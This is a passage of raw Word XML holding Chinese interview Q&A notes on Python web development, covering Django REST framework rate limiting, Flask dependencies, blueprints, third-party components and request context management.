      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中进行认证处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C06D801" w14:textId="1E917BD2"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063</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django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>如何实现的用户访问频率控制？</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D99753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对匿名用户，根据用户</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或代理</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>作为标识进行记录，为每个用户在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中建一个列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233239B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58DDC61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throttle_1.1.1.1:[1526868876.497521,152686885.497521...]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F04AC8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throttle_1.1.1.2:[1526868876.497521,152686885.497521...]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015AB66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throttle_1.1.1.3:[1526868876.497521,152686885.497521...]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1013F8E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p>
    <w:p w14:paraId="693FFF2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每个用户再来访问时，需先去记录中剔除过期记录，再根据列表的长度判断是否可以继续访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="572C1C3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如何封</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IP'</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：在防火墙中进行设置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5244915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p>
    <w:p w14:paraId="2B88015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对注册用户，根据用户名或邮箱进行判断。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA7EE1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1466153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throttle_xxxx1:[1526868876.497521,152686885.497521...]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B48BA8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throttle_xxxx2:[1526868876.497521,152686885.497521...]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20293EF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throttle_xxxx3:[1526868876.497521,152686885.497521...]</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6962373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77EE1C5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每个用户再来访问时，需先去记录中剔除过期记录，再根据列表的长度判断是否可以继续访问。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE581A4" w14:textId="037F74FC"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如</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>分钟：</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>40</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>次，列表长度限制在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>40</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，超过</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>40</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>则不可访问</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AB763F" w14:textId="0737A5CC"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064</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框架的优势？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14E450E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Flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自由、灵活，可扩展性强，透明可控，第三方库的选择面广，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173D8E50" w14:textId="42AE96C6"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开发时可以结合最流行最强大的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>库，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8943EB" w14:textId="3B42E47C"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065</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框架依赖组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFF525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依赖</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>jinja2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>模板引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B467533" w14:textId="745480EA"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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>依赖</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>werkzurg</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>协议</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="490AF972" w14:textId="4D42A4C4"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066</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蓝图的作用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4510750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blueprint</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>把实现不同功能的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>module</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>分开</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也就是把一个大的</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分割成各自实现不同功能的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D2E86B" w14:textId="56797B55"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在一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blueprint</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中可以调用另一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blueprint</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的视图函数</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但要加相应的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>blueprint</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>名</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55D10C39" w14:textId="4131D011"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067</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列举使用的</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第三方组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCEC53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Flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6FC48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flask-session  session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>放在</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD2BC0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flask-SQLAlchemy </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>如</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>里的</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>ORM</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B83CAE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flask-migrate  </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>数据库迁移</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0BFDE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flask-script  </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>自定义命令</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09173AE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blinker  </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>信号</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触发信号</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3AFF5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第三方组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0163780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Wtforms </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>快速创建前端标签、文本校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFFF42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dbutile     </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>创建数据库连接池</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7945D5E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gevnet-websocket </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>实现</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072B050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自定义</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Flask</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186C09B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自定义</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>auth</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>认证</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C05A61" w14:textId="2833CCA5"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参考</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>flask-login</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BB30F2" w14:textId="77065CD8"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068</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简述</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上下文管理流程</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455190C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a</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、简单来说，</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>falsk</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>上下文管理可以分为三个阶段：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652AF19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1</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请求进来时</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：将请求相关的数据放入上下问管理中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B83E20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2</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在视图函数中</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：要去上下文管理中取值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D83507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3</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请求响应</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：要将上下文管理中的数据清除</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B3570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b</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、详细点来说：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181E60F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1</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请求刚进来</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p>
    <w:p w14:paraId="6079B64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w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>request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session</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC0D9A">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
